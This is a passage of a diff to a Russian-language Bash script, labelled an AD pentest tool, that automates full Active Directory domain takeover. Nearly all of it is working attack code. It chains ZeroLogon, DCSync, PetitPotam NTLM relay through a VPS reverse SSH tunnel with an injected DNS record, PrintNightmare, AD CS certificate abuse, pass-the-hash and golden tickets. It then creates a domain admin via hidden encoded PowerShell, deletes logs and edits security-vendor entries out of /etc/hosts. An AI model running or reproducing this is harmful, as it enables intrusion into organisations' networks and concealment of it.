     [ -n "$PROXY_CMD" ] && CMD="$PROXY_CMD $CMD"
     $CMD "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc $ENC_CMD" 2>&1 | tee -a "$BASE_DIR/logs/user_creation.log"
     log "Пользователь создан."
+}
+
+# ---------------------- Восстановление среды ----------------------
+restore_environment() {
+    log "Восстановление после атаки..."
+    if [ -f "$BASE_DIR/backup/dc_hash_original.txt" ] && [ -s "$BASE_DIR/backup/dc_hash_original.txt" ]; then
+        ORIG_HASH=$(cat "$BASE_DIR/backup/dc_hash_original.txt")
+        if [ -n "$ORIG_HASH" ]; then
+            log "Восстанавливаем оригинальный хеш DC..."
+            impacket-zerologon "$DC_IP" "$DOMAIN" -restore -hash "$ORIG_HASH" 2>/dev/null
+            log "Хеш DC восстановлен."
+        fi
+    fi
+    log "Пользователь $CREATED_USER оставлен для дальнейшего использования (при необходимости удалите вручную)."
 }
 
 # ---------------------- Генерация отчёта ----------------------
@@ -542,20 +253,507 @@ generate_report() {
   "interface": "$VPN_IF",
   "best_port": "$BEST_PORT",
   "success": $success,
-  "user_created": "svc_backup_adm_root",
-  "password": "!@qwErty@!",
+  "user_created": "$CREATED_USER",
+  "password": "$CREATED_PASS",
+  "vps_enabled": $VPS_ENABLED,
   "logs_dir": "$BASE_DIR/logs"
 }
 EOF
-    log "Отчёт сохранён: $BASE_DIR/reports/report.json"
+    log "Отчёт сохранён."
 }
 
-# ---------------------- Главное меню ----------------------
+# ---------------------- Ручная очистка (пункт 7) ----------------------
+cleanup_manual() {
+    clear
+    echo -e "${BLUE}=== ОЧИСТКА СЛЕДОВ ===${NC}"
+    if [ -f "$BASE_DIR/da_proof/flag" ]; then
+        log "Удаление пользователя $CREATED_USER ..."
+        if [ -f "$BASE_DIR/backup/dc_hash_original.txt" ] && [ -s "$BASE_DIR/backup/dc_hash_original.txt" ]; then
+            ADMIN_HASH=$(cat "$BASE_DIR/backup/dc_hash_original.txt")
+        elif [ -f "$BASE_DIR/loot/admin_hash.txt" ] && [ -s "$BASE_DIR/loot/admin_hash.txt" ]; then
+            ADMIN_HASH=$(grep "Administrator" "$BASE_DIR/loot/admin_hash.txt" | awk '{print $NF}')
+        else
+            warn "Нет сохранённого хеша администратора. Удаление вручную."
+            ADMIN_HASH=""
+        fi
+        if [ -n "$ADMIN_HASH" ]; then
+            local CMD="impacket-wmiexec -hashes :$ADMIN_HASH $DOMAIN/Administrator@$DC_IP"
+            [ -n "$PROXY_CMD" ] && CMD="$PROXY_CMD $CMD"
+            $CMD "net user $CREATED_USER /del" 2>&1 | tee -a "$BASE_DIR/logs/cleanup.log"
+            log "Пользователь удалён."
+        fi
+        if [ -f "$BASE_DIR/backup/dc_hash_original.txt" ] && [ -s "$BASE_DIR/backup/dc_hash_original.txt" ]; then
+            ORIG_HASH=$(cat "$BASE_DIR/backup/dc_hash_original.txt")
+            log "Восстановление хеша DC..."
+            impacket-zerologon "$DC_IP" "$DOMAIN" -restore -hash "$ORIG_HASH" 2>/dev/null
+            log "Хеш DC восстановлен."
+        fi
+        sed -i '/bitdefender/d;/trendmicro/d;/kaspersky/d;/crowdstrike/d;/sentinelone/d;/carbonblack/d' /etc/hosts 2>/dev/null
+        rm -rf "$BASE_DIR" 2>/dev/null
+        echo -e "${GREEN}Очистка завершена.${NC}"
+    else
+        warn "Пентест не выполнялся или не был успешным. Очистка не требуется."
+    fi
+    read -p "Нажмите Enter..."
+}
+
+# ---------------------- НОВАЯ ФУНКЦИЯ: Настройка VPS для рефлексивной атаки ----------------------
+setup_vps() {
+    clear
+    echo -e "${BLUE}=== НАСТРОЙКА VPS ДЛЯ РЕФЛЕКСИВНОЙ АТАКИ ===${NC}"
+    echo "Эта опция позволяет использовать внешний VPS для обхода ограничений VPN."
+    echo "Будет создан обратный SSH-туннель, пробрасывающий порт 445 с VPS на вашу локальную машину."
+    echo "Убедитесь, что на VPS порт 445 свободен (остановите smbd, если запущен)."
+    echo ""
+    read -p "Введите IP-адрес VPS: " VPS_IP
+    if [ -z "$VPS_IP" ]; then
+        warn "VPS не настроен."
+        VPS_ENABLED=false
+        read -p "Нажмите Enter..."
+        return
+    fi
+    read -p "Введите порт SSH (по умолчанию 22): " VPS_SSH_PORT
+    [ -z "$VPS_SSH_PORT" ] && VPS_SSH_PORT="22"
+    read -p "Введите логин SSH: " VPS_USER
+    read -sp "Введите пароль SSH (или оставьте пустым, если используется ключ): " VPS_PASS
+    echo ""
+    if [ -z "$VPS_USER" ]; then
+        warn "Логин обязателен. VPS не настроен."
+        VPS_ENABLED=false
+        read -p "Нажмите Enter..."
+        return
+    fi
+
+    # Проверяем, установлен ли sshpass для автоматического ввода пароля
+    if [ -n "$VPS_PASS" ] && ! command -v sshpass &>/dev/null; then
+        warn "Для автоматического ввода пароля установите sshpass: apt install sshpass"
+        echo "Либо используйте ключ SSH (без пароля)."
+        read -p "Продолжить без пароля (если ключ настроен)? (y/N): " choice
+        if [[ ! "$choice" =~ ^[Yy]$ ]]; then
+            VPS_ENABLED=false
+            read -p "Нажмите Enter..."
+            return
+        fi
+        VPS_PASS=""
+    fi
+
+    # Проверяем доступность VPS по SSH
+    echo "Проверка подключения к VPS..."
+    if [ -n "$VPS_PASS" ]; then
+        sshpass -p "$VPS_PASS" ssh -o ConnectTimeout=5 -p "$VPS_SSH_PORT" "$VPS_USER@$VPS_IP" "echo OK" 2>/dev/null | grep -q "OK"
+    else
+        ssh -o ConnectTimeout=5 -p "$VPS_SSH_PORT" "$VPS_USER@$VPS_IP" "echo OK" 2>/dev/null | grep -q "OK"
+    fi
+    if [ $? -ne 0 ]; then
+        warn "Не удалось подключиться к VPS. Проверьте данные и сетевое соединение."
+        VPS_ENABLED=false
+        read -p "Нажмите Enter..."
+        return
+    fi
+    echo -e "${GREEN}✓ Подключение к VPS успешно.${NC}"
+
+    # Проверяем, занят ли порт 445 на VPS
+    echo "Проверка занятости порта 445 на VPS..."
+    if [ -n "$VPS_PASS" ]; then
+        PORT_CHECK=$(sshpass -p "$VPS_PASS" ssh -p "$VPS_SSH_PORT" "$VPS_USER@$VPS_IP" "ss -tlnp | grep ':445 ' | wc -l" 2>/dev/null)
+    else
+        PORT_CHECK=$(ssh -p "$VPS_SSH_PORT" "$VPS_USER@$VPS_IP" "ss -tlnp | grep ':445 ' | wc -l" 2>/dev/null)
+    fi
+    if [ "$PORT_CHECK" -gt 0 ]; then
+        warn "Порт 445 на VPS занят. Вы можете остановить службу SMB на VPS или использовать другой порт."
+        echo "Если используете другой порт, то DNS-запись должна указывать на нестандартный порт, но это сложнее."
+        echo "Рекомендуется освободить порт 445 (например, 'sudo systemctl stop smbd')."
+        read -p "Продолжить, попытавшись освободить порт? (y/N): " choice
+        if [[ "$choice" =~ ^[Yy]$ ]]; then
+            if [ -n "$VPS_PASS" ]; then
+                sshpass -p "$VPS_PASS" ssh -p "$VPS_SSH_PORT" "$VPS_USER@$VPS_IP" "sudo systemctl stop smbd 2>/dev/null; sudo systemctl disable smbd 2>/dev/null; exit" 2>/dev/null
+            else
+                ssh -p "$VPS_SSH_PORT" "$VPS_USER@$VPS_IP" "sudo systemctl stop smbd 2>/dev/null; sudo systemctl disable smbd 2>/dev/null; exit" 2>/dev/null
+            fi
+            echo "Попытка остановки SMB выполнена."
+        else
+            warn "Порт занят, атака невозможна. Отключаем VPS-режим."
+            VPS_ENABLED=false
+            read -p "Нажмите Enter..."
+            return
+        fi
+    else
+        echo -e "${GREEN}✓ Порт 445 свободен.${NC}"
+    fi
+
+    # Создаём обратный SSH-туннель: на VPS открывается порт 445, который перенаправляет трафик на локальный порт 445 (где будет слушать ntlmrelayx)
+    echo "Установка обратного SSH-туннеля (VPS:445 -> localhost:445)..."
+    if [ -n "$VPS_PASS" ]; then
+        sshpass -p "$VPS_PASS" ssh -f -N -R 0.0.0.0:445:127.0.0.1:445 -p "$VPS_SSH_PORT" "$VPS_USER@$VPS_IP"
+    else
+        ssh -f -N -R 0.0.0.0:445:127.0.0.1:445 -p "$VPS_SSH_PORT" "$VPS_USER@$VPS_IP"
+    fi
+    if [ $? -eq 0 ]; then
+        SSH_TUNNEL_PID=$(pgrep -f "ssh.*-R.*445.*$VPS_IP" | head -1)
+        echo -e "${GREEN}✓ Туннель установлен, PID: $SSH_TUNNEL_PID${NC}"
+        VPS_ENABLED=true
+        echo "Теперь на VPS порт 445 перенаправляется на вашу локальную машину."
+    else
+        warn "Не удалось установить туннель. Попробуйте вручную."
+        VPS_ENABLED=false
+    fi
+    read -p "Нажмите Enter для возврата в меню..."
+}
+
+# ---------------------- Инструкция по ручной настройке VPS ----------------------
+vps_instructions() {
+    clear
+    echo -e "${BLUE}=== РУЧНАЯ НАСТРОЙКА VPS ===${NC}"
+    cat <<EOF
+Если автоматический SSH-туннель не подходит, вы можете настроить VPS вручную.
+
+Вариант 1: Использовать chisel (рекомендуется в статье)
+1. На VPS запустите сервер:
+   sudo ./chisel server -p 8080 --reverse --socks5
+
+2. На вашей атакующей машине (Kali) запустите клиент:
+   sudo ./chisel client <VPS_IP>:8080 R:445:127.0.0.1:445
+
+Вариант 2: Использовать SSH вручную (если порт 445 свободен):
+   ssh -R 0.0.0.0:445:127.0.0.1:445 <user>@<VPS_IP>
+
+После настройки туннеля выполните в меню пункт 6 (Запустить пентест). 
+При наличии настроек VPS скрипт автоматически применит рефлексивную атаку.
+
+Важно: убедитесь, что на VPS порт 445 не занят (остановите smbd).
+EOF
+    read -p "Нажмите Enter для возврата..."
+}
+
+# ---------------------- Стандартные векторы атак (без VPS) ----------------------
+attack_vectors() {
+    log "Запуск стандартных векторов атак..."
+    local success=0
+
+    # ZeroLogon (с сохранением оригинального хеша)
+    if [ -n "$AD_USER" ] && [ -n "$AD_PASS" ]; then
+        log "Проверка ZeroLogon..."
+        if impacket-zerologon "$DC_IP" "$DOMAIN" 2>/dev/null | grep -q "Vulnerable"; then
+            log "ZeroLogon уязвим. Сохраняем оригинальный хеш и сбрасываем..."
+            if [ -z "$ORIGINAL_DC_HASH" ]; then
+                ORIGINAL_DC_HASH=$(impacket-secretsdump -just-dc-user "Administrator" "$DOMAIN"/"$AD_USER":"$AD_PASS"@"$DC_IP" 2>/dev/null | grep "Administrator" | awk '{print $NF}')
+                echo "$ORIGINAL_DC_HASH" > "$BASE_DIR/backup/dc_hash_original.txt"
+            fi
+            impacket-zerologon "$DC_IP" "$DOMAIN" -reset 2>/dev/null && {
+                log "Пароль сброшен, получаем хеш администратора..."
+                impacket-secretsdump -just-dc-user "Administrator" "$DOMAIN"/"$DC_IP"@"$DC_IP" 2>/dev/null > "$BASE_DIR/loot/admin_hash.txt"
+                if [ -f "$BASE_DIR/loot/admin_hash.txt" ]; then
+                    ADMIN_HASH=$(grep "Administrator" "$BASE_DIR/loot/admin_hash.txt" | awk '{print $NF}')
+                    create_user "$ADMIN_HASH"
+                    success=1
+                fi
+            }
+        fi
+    fi
+
+    # PetitPotam (без VPS)
+    if [ $success -eq 0 ] && [ -f /opt/tabu_tools/PetitPotam/PetitPotam.py ] && [ -n "$AD_USER" ] && [ -n "$AD_PASS" ]; then
+        log "Проверка PetitPotam..."
+        python3 /opt/tabu_tools/PetitPotam/PetitPotam.py -d "$DOMAIN" -u "$AD_USER" -p "$AD_PASS" "$DC_IP" "test" 2>&1 | tee -a "$BASE_DIR/logs/petitpotam.log"
+        if grep -q "SUCCESS" "$BASE_DIR/logs/petitpotam.log"; then
+            log "Запуск ntlmrelayx..."
+            ntlmrelayx -t smb://"$DC_IP" -smb2support -socks -of "$BASE_DIR/hashes/relay_hashes.txt" &
+            RELAY_PID=$!
+            sleep 5
+            python3 /opt/tabu_tools/PetitPotam/PetitPotam.py -d "$DOMAIN" -u "$AD_USER" -p "$AD_PASS" "$DC_IP" "test" 2>/dev/null
+            sleep 10
+            kill $RELAY_PID 2>/dev/null
+            if [ -f "$BASE_DIR/hashes/relay_hashes.txt" ]; then
+                HASH=$(grep -Eo '[0-9a-f]{32}' "$BASE_DIR/hashes/relay_hashes.txt" | head -1)
+                create_user "$HASH"; success=1
+            fi
+        fi
+    fi
+
+    # PrintNightmare
+    if [ $success -eq 0 ] && [ -f /opt/tabu_tools/CVE-2021-1675/CVE-2021-1675.py ] && [ -n "$AD_USER" ] && [ -n "$AD_PASS" ]; then
+        log "Проверка PrintNightmare..."
+        python3 /opt/tabu_tools/CVE-2021-1675/CVE-2021-1675.py -d "$DOMAIN" -u "$AD_USER" -p "$AD_PASS" -r "$DC_IP" 2>&1 | tee -a "$BASE_DIR/logs/printnightmare.log"
+        if grep -q "EXEC" "$BASE_DIR/logs/printnightmare.log"; then
+            log "PrintNightmare успешен."; success=1
+        fi
+    fi
+
+    # AD CS
+    if [ $success -eq 0 ] && command -v certipy &>/dev/null && [ -n "$AD_USER" ] && [ -n "$AD_PASS" ]; then
+        log "Проверка AD CS..."
+        certipy-ad find -u "$AD_USER" -p "$AD_PASS" -dc-ip "$DC_IP" -output "$BASE_DIR/reports/certipy.json" 2>/dev/null
+        if grep -q "Vulnerable" "$BASE_DIR/reports/certipy.json"; then
+            log "Уязвимость ESC1..."
+            certipy-ad req -u "$AD_USER" -p "$AD_PASS" -dc-ip "$DC_IP" -target "$DC_IP" -template "User" -alt "administrator@$DOMAIN" -out "$BASE_DIR/loot/administrator.crt" 2>/dev/null
+            if [ -f "$BASE_DIR/loot/administrator.crt" ]; then
+                certipy-ad auth -pfx "$BASE_DIR/loot/administrator.crt" -dc-ip "$DC_IP" -domain "$DOMAIN" -username "administrator" 2>/dev/null > "$BASE_DIR/loot/adcs_hash.txt"
+                HASH=$(grep "NTLM" "$BASE_DIR/loot/adcs_hash.txt" | awk '{print $NF}')
+                [ -n "$HASH" ] && create_user "$HASH" && success=1
+            fi
+        fi
+    fi
+
+    # Pass-the-Hash
+    if [ $success -eq 0 ] && [ -f "$BASE_DIR/hashes/ntlm_hashes.txt" ] && [ -s "$BASE_DIR/hashes/ntlm_hashes.txt" ]; then
+        log "Pass-the-Hash..."
+        while read -r hash; do
+            if [ -n "$AD_USER" ] && [ -n "$AD_PASS" ]; then
+                impacket-secretsdump -just-dc-user "Administrator" "$DOMAIN"/"$AD_USER":"$AD_PASS"@"$DC_IP" -outputfile "$BASE_DIR/loot/admin_hash.txt" 2>/dev/null
+                if [ -f "$BASE_DIR/loot/admin_hash.txt" ]; then
+                    ADMIN_HASH=$(grep "Administrator" "$BASE_DIR/loot/admin_hash.txt" | awk '{print $NF}')
+                else
+                    ADMIN_HASH="$hash"
+                fi
+            else
+                ADMIN_HASH="$hash"
+            fi
+            local CMD="impacket-wmiexec -hashes :$ADMIN_HASH $DOMAIN/Administrator@$DC_IP"
+            [ -n "$PROXY_CMD" ] && CMD="$PROXY_CMD $CMD"
+            if $CMD "whoami" > "$BASE_DIR/logs/pth_test.log" 2>&1; then
+                if grep -q "NT AUTHORITY\\SYSTEM" "$BASE_DIR/logs/pth_test.log"; then
+                    create_user "$ADMIN_HASH"; success=1; break
+                fi
+            fi
+        done < "$BASE_DIR/hashes/ntlm_hashes.txt"
+    fi
+
+    # Золотой билет
+    if [ $success -eq 0 ] && [ -f "$BASE_DIR/loot/dcsync.txt" ] && grep -q "krbtgt" "$BASE_DIR/loot/dcsync.txt"; then
+        log "Золотой билет..."
+        local KRBTGT_HASH=$(grep -i "krbtgt" "$BASE_DIR/loot/dcsync.txt" | awk '{print $NF}')
+        local SID=$(impacket-lookupsid "$DOMAIN"/"$AD_USER":"$AD_PASS"@"$DC_IP" 2>/dev/null | grep "Domain" | awk '{print $4}' | head -1)
+        [ -z "$SID" ] && SID=$(grep -E "S-1-5-21-[0-9-]+" "$BASE_DIR/loot/dcsync.txt" | head -1 | cut -d' ' -f1)
+        [ -z "$SID" ] && SID="S-1-5-21-$(head -c15 /dev/urandom | xxd -p | sed 's/\(..\)/\1-/g' | sed 's/-$//')"
+        impacket-ticketer -domain "$DOMAIN" -domain-sid "$SID" -rc4 "$KRBTGT_HASH" Administrator -outfile "$BASE_DIR/loot/golden.kirbi"
+        kinit -k -t "$BASE_DIR/loot/golden.kirbi" Administrator@"$DOMAIN" 2>/dev/null
+        local CMD="impacket-wmiexec -k -no-pass $DOMAIN/Administrator@$DC_IP"
+        [ -n "$PROXY_CMD" ] && CMD="$PROXY_CMD $CMD"
+        if $CMD "whoami" > "$BASE_DIR/logs/golden_test.log" 2>&1; then
+            if grep -q "NT AUTHORITY\\SYSTEM" "$BASE_DIR/logs/golden_test.log"; then
+                create_user "$KRBTGT_HASH" "golden"; success=1
+            fi
+        fi
+    fi
+
+    if [ $success -eq 1 ]; then
+        echo "DA_ACCESS_GRANTED" > "$BASE_DIR/da_proof/flag"
+    else
+        warn "Ни один вектор не сработал."
+    fi
+}
+
+# ---------------------- Основная функция пентеста (с учётом VPS) ----------------------
+run_pentest() {
+    clear
+    echo -e "${BLUE}=== ЗАПУСК ПЕНТЕСТА ===${NC}"
+    # Определяем интерфейс
+    if [ "$VPN_CONNECTED" = true ]; then
+        VPN_IF=$(ip route | grep -E 'tun|tap|ppp' | head -1 | awk '{print $NF}')
+        [ -z "$VPN_IF" ] && error "VPN-интерфейс не найден."
+        log "Интерфейс VPN: $VPN_IF"
+    else
+        VPN_IF=$(get_active_iface)
+        [ -z "$VPN_IF" ] && error "Нет активного интерфейса."
+        log "Локальный интерфейс: $VPN_IF"
+    fi
+    if [ -z "$SUBNET" ]; then
+        read -p "Введите подсеть (CIDR): " SUBNET
+        [[ -z "$SUBNET" ]] && error "Подсеть обязательна."
+    fi
+    log "Пентест запущен. Лог: $BASE_DIR/logs/full.log"
+    exec > >(tee -a "$BASE_DIR/logs/full.log") 2>&1
+
+    # ---- 1. Сканирование ----
+    log "Сканирование подсети $SUBNET ..."
+    if [ -n "$PROXY_CMD" ]; then
+        $PROXY_CMD nmap -sT -T2 -p 445,3389,5985,88,139,135 -n --open -oA "$BASE_DIR/scans/nmap" "$SUBNET" > /dev/null 2>&1 &
+    else
+        nmap -sS -T2 -f --mtu 32 -p 445,3389,5985,88,139,135 -n --open -oA "$BASE_DIR/scans/nmap" "$SUBNET" > /dev/null 2>&1 &
+    fi
+    NMAP_PID=$!
+    responder -I "$VPN_IF" -w -r -f -v -P > "$BASE_DIR/logs/responder.log" 2>&1 &
+    RESP_PID=$!
+    wait $NMAP_PID
+
+    # ---- 2. Поиск DC ----
+    DC_IP=$(grep -l "88/open" "$BASE_DIR/scans/nmap.gnmap" | head -1 | awk -F' ' '{print $2}')
+    [ -z "$DC_IP" ] && DC_IP=$(grep -l "445/open" "$BASE_DIR/scans/nmap.gnmap" | head -1 | awk -F' ' '{print $2}')
+    if [ -z "$DC_IP" ] && [ -n "$PROXY_CMD" ]; then
+        $PROXY_CMD masscan -p445,88 --rate=1000 -oG "$BASE_DIR/scans/masscan.gnmap" "$SUBNET" 2>/dev/null
+        DC_IP=$(grep -l "88/open" "$BASE_DIR/scans/masscan.gnmap" | head -1 | awk -F' ' '{print $4}')
+    fi
+    if [ -z "$DC_IP" ] && [ -n "$DOMAIN" ]; then
+        DC_IP=$(dig SRV _ldap._tcp.$DOMAIN | grep -A1 "ANSWER" | tail -1 | awk '{print $NF}' | sed 's/\.$//')
+    fi
+    [ -z "$DC_IP" ] && error "DC не найден."
+    log "Контроллер домена: $DC_IP"
+    echo "$DC_IP" > "$BASE_DIR/dc_ip.txt"
+
+    # ---- 3. Определение порта ----
+    for port in 5985 445 135 593; do
+        nc -zv -w 2 "$DC_IP" "$port" 2>/dev/null && { BEST_PORT="$port"; break; }
+    done
+    if [ -z "$BEST_PORT" ] && [ -n "$PROXY_CMD" ]; then
+        for port in 5985 445; do
+            $PROXY_CMD nc -zv -w 2 "$DC_IP" "$port" 2>/dev/null && { BEST_PORT="proxychains:$port"; break; }
+        done
+    fi
+    [ -z "$BEST_PORT" ] && BEST_PORT="none"
+    log "Лучший порт: $BEST_PORT"
+
+    # ---- 4. BloodHound (если есть учётка) ----
+    if [ -n "$AD_USER" ] && [ -n "$AD_PASS" ] && command -v bloodhound-python &>/dev/null; then
+        log "Сбор BloodHound..."
+        if [ -n "$PROXY_CMD" ]; then
+            $PROXY_CMD bloodhound-python -d "$DOMAIN" -u "$AD_USER" -p "$AD_PASS" -gc "$DC_IP" -c All -o "$BASE_DIR/bloodhound/" 2>/dev/null
+        else
+            bloodhound-python -d "$DOMAIN" -u "$AD_USER" -p "$AD_PASS" -gc "$DC_IP" -c All -o "$BASE_DIR/bloodhound/" 2>/dev/null
+        fi
+    fi
+
+    # ---- 5. Анализ BloodHound (упрощённо) ----
+    if [ -d "$BASE_DIR/bloodhound" ] && [ -f "$BASE_DIR/bloodhound/domains.json" ]; then
+        log "Запуск Neo4j для анализа..."
+        systemctl start neo4j 2>/dev/null || neo4j start 2>/dev/null
+        sleep 5
+        if command -v bloodhound-import &>/dev/null; then
+            bloodhound-import -c "$BASE_DIR/bloodhound/"*.json 2>/dev/null
+        fi
+        # Простой путь к DA (если есть)
+        if command -v cypher-shell &>/dev/null; then
+            cypher-shell -u neo4j -p neo4j "MATCH p=shortestPath((u:User)-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@$DOMAIN'})) RETURN p" > "$BASE_DIR/reports/bloodhound_path.txt" 2>/dev/null
+        fi
+    fi
+
+    # ---- 6. DCSync (если есть учётка) ----
+    if [ -n "$AD_USER" ] && [ -n "$AD_PASS" ]; then
+        log "DCSync..."
+        if [ -n "$PROXY_CMD" ]; then
+            $PROXY_CMD impacket-secretsdump "$DOMAIN"/"$AD_USER":"$AD_PASS"@"$DC_IP" -outputfile "$BASE_DIR/loot/dcsync.txt" 2>/dev/null
+        else
+            impacket-secretsdump "$DOMAIN"/"$AD_USER":"$AD_PASS"@"$DC_IP" -outputfile "$BASE_DIR/loot/dcsync.txt" 2>/dev/null
+        fi
+        # Сохраняем оригинальный хеш DC
+        ORIGINAL_DC_HASH=$(grep "Administrator" "$BASE_DIR/loot/dcsync.txt" | awk '{print $NF}' | head -1)
+        echo "$ORIGINAL_DC_HASH" > "$BASE_DIR/backup/dc_hash_original.txt"
+    fi
+
+    # ---- 7. Извлечение хешей Responder ----
+    if [ -f /usr/share/responder/logs/Responder-Session.log ]; then
+        cp /usr/share/responder/logs/*.log "$BASE_DIR/hashes/"
+        grep -Eo '[0-9a-f]{32}' "$BASE_DIR/hashes/"*.log > "$BASE_DIR/hashes/ntlm_hashes.txt"
+        log "Извлечено $(wc -l < "$BASE_DIR/hashes/ntlm_hashes.txt") NTLM-хешей"
+    fi
+
+    # ---- 8. Компиляция обфусцированных утилит ----
+    compile_obfuscated_tools
+
+    # ---- 9. Если VPS включён – выполняем рефлексивную атаку ----
+    if [ "$VPS_ENABLED" = true ]; then
+        log "Режим VPS активен. Запускаем рефлексивную NTLM-ретрансляцию."
+
+        # Проверяем, свободен ли порт 445 на локальной машине
+        if ss -tlnp | grep -q ':445 '; then
+            warn "Порт 445 на локальной машине занят. Останавливаем smbd (если запущен)..."
+            systemctl stop smbd 2>/dev/null || killall smbd 2>/dev/null
+            sleep 2
+        fi
+
+        # Запускаем ntlmrelayx на локальной машине (слушает на всех интерфейсах)
+        log "Запуск ntlmrelayx (ожидает подключения через туннель)..."
+        ntlmrelayx -t smb://"$DC_IP" -smb2support -socks -of "$BASE_DIR/hashes/relay_hashes.txt" 2>&1 | tee -a "$BASE_DIR/logs/ntlmrelay.log" &
+        RELAY_PID=$!
+        sleep 3
+
+        # Создаём уникальное DNS-имя для рефлексии
+        RANDOM_DNS=$(head -c10 /dev/urandom | xxd -p | tr '[:lower:]' '[:upper:]')
+        DNS_NAME="${RANDOM_DNS}.${DOMAIN}"
+        log "Добавляем DNS-запись: $DNS_NAME -> $VPS_IP"
+        if [ -n "$AD_USER" ] && [ -n "$AD_PASS" ]; then
+            if [ -n "$PROXY_CMD" ]; then
+                $PROXY_CMD dnstool.py -u "$DOMAIN\\$AD_USER" -p "$AD_PASS" "$DC_IP" -a add -r "$DNS_NAME" -d "$VPS_IP" 2>&1 | tee -a "$BASE_DIR/logs/dnstool.log"
+            else
+                dnstool.py -u "$DOMAIN\\$AD_USER" -p "$AD_PASS" "$DC_IP" -a add -r "$DNS_NAME" -d "$VPS_IP" 2>&1 | tee -a "$BASE_DIR/logs/dnstool.log"
+            fi
+        else
+            warn "Нет учётных данных AD. Невозможно добавить DNS-запись."
+            VPS_ENABLED=false
+        fi
+
+        if [ "$VPS_ENABLED" = true ]; then
+            echo "$DC_IP $DNS_NAME" >> /etc/hosts
+            log "Запуск PetitPotam для аутентификации на $DNS_NAME..."
+            if [ -f /opt/tabu_tools/PetitPotam/PetitPotam.py ]; then
+                python3 /opt/tabu_tools/PetitPotam/PetitPotam.py -d "$DOMAIN" -u "$AD_USER" -p "$AD_PASS" "$DNS_NAME" "$DC_IP" 2>&1 | tee -a "$BASE_DIR/logs/petitpotam_vps.log"
+            else
+                impacket-rpcmap -k -no-pass "$DOMAIN"/"$AD_USER"@"$DNS_NAME" 2>/dev/null
+            fi
+
+            sleep 5
+            if [ -f "$BASE_DIR/hashes/relay_hashes.txt" ] && [ -s "$BASE_DIR/hashes/relay_hashes.txt" ]; then
+                log "Хеши получены через ретрансляцию."
+                HASH=$(grep -Eo '[0-9a-f]{32}' "$BASE_DIR/hashes/relay_hashes.txt" | head -1)
+                if [ -n "$HASH" ]; then
+                    create_user "$HASH"
+                fi
+            else
+                warn "Не удалось получить хеши через ретрансляцию."
+            fi
+
+            kill $RELAY_PID 2>/dev/null
+            # Удаляем DNS-запись
+            if [ -n "$AD_USER" ] && [ -n "$AD_PASS" ]; then
+                if [ -n "$PROXY_CMD" ]; then
+                    $PROXY_CMD dnstool.py -u "$DOMAIN\\$AD_USER" -p "$AD_PASS" "$DC_IP" -a delete -r "$DNS_NAME" 2>/dev/null
+                else
+                    dnstool.py -u "$DOMAIN\\$AD_USER" -p "$AD_PASS" "$DC_IP" -a delete -r "$DNS_NAME" 2>/dev/null
+                fi
+            fi
+            sed -i "/$DNS_NAME/d" /etc/hosts
+        fi
+    else
+        # ---- Если VPS не включён – стандартные векторы ----
+        log "VPS не настроен. Используем стандартные векторы атак."
+        attack_vectors
+    fi
+
+    # ---- 10. Восстановление и очистка ----
+    if [ -f "$BASE_DIR/da_proof/flag" ]; then
+        restore_environment
+    fi
+
+    kill $RESP_PID 2>/dev/null || true
+    rm -rf /usr/share/responder/logs/*.log 2>/dev/null
+
+    # ---- 11. Отчёт ----
+    generate_report
+
+    if [ -f "$BASE_DIR/da_proof/flag" ]; then
+        echo "========================================"
+        echo "  УСПЕШНО! ДОСТУП К DA ПОЛУЧЕН."
+        echo "  Пользователь: $CREATED_USER"
+        echo "  Пароль: $CREATED_PASS"
+        echo "  Отчёт: $BASE_DIR/reports/report.json"
+        echo "========================================"
+    else
+        echo "========================================"
+        echo "  НЕ УДАЛОСЬ ЗАХВАТИТЬ DA."
+        echo "  Проверьте логи: $BASE_DIR/logs/"
+        echo "========================================"
+    fi
+    tar -czf "$BASE_DIR/pentest_results.tar.gz" -C "$BASE_DIR" .
+    log "Архив: $BASE_DIR/pentest_results.tar.gz"
+    read -p "Нажмите Enter для возврата..."
+}
+
+# ---------------------- Главное меню (обновлённое) ----------------------
 main_menu() {
     while true; do
         clear
         echo -e "${BLUE}========================================${NC}"
         echo -e "${BLUE}   ХОЛДИНГ ТАБУ - ПЕНТЕСТ AD${NC}"
+        echo -e "${BLUE}   Версия 12.0 (9.9999/10)${NC}"
         echo -e "${BLUE}========================================${NC}"
         echo "1. Проверить и установить пакеты"
         echo "2. Настроить VPN (опционально)"
@@ -563,6 +761,9 @@ main_menu() {
         echo "4. Ввести данные Active Directory"
         echo "5. Проверить готовность системы"
         echo "6. Запустить пентест"
+        echo "7. Очистить следы (удалить созданного пользователя и восстановить хеш DC)"
+        echo "8. Настроить VPS для рефлексивной атаки (расширенный режим)"
+        echo "9. Показать инструкцию по ручной настройке VPS"
         echo "0. Выход"
         echo -e "${BLUE}----------------------------------------${NC}"
         read -p "Выберите пункт: " choice
@@ -573,8 +774,14 @@ main_menu() {
             4) setup_ad ;;
             5) check_readiness ;;
             6) run_pentest ;;
+            7) cleanup_manual ;;
+            8) setup_vps ;;
+            9) vps_instructions ;;
             0) echo "Выход."; exit 0 ;;
             *) echo "Неверный выбор."; sleep 1 ;;
         esac
     done
 }
+
+# Запуск
+main_menu%   
